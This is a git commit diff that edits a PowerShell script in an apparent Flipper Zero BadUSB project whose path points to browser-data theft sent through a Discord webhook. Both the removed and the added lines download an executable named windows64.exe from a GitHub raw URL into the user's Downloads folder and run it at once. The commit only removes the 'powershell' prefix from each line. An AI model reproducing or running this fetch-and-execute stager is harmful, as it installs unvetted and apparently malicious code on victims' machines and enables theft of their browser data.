7377a43925f4d8f0f1edde7c70044263f18bf246
Chris <christophe.da.cruz.tic@gmail.com>
2023-12-25 22:02:44 +0100

    test fix

--- badusb/BrowserData/discord_wh_windows.ps1
+++ badusb/BrowserData/discord_wh_windows.ps1
@@ -1,4 +1,4 @@
-powershell $url = "https://raw.githubusercontent.com/MagikarpLv13/flipper-zero/main/badusb/BrowserData/External/windows64.exe"
-powershell $destination = [System.IO.Path]::Combine($env:UserProfile, 'Downloads', 'windows64.exe')
-powershell Invoke-WebRequest -Uri $url -OutFile $destination
-powershell Start-Process -FilePath $destination -Wait
+$url = "https://raw.githubusercontent.com/MagikarpLv13/flipper-zero/main/badusb/BrowserData/External/windows64.exe"
+$destination = [System.IO.Path]::Combine($env:UserProfile, 'Downloads', 'windows64.exe')
+Invoke-WebRequest -Uri $url -OutFile $destination
+Start-Process -FilePath $destination -Wait
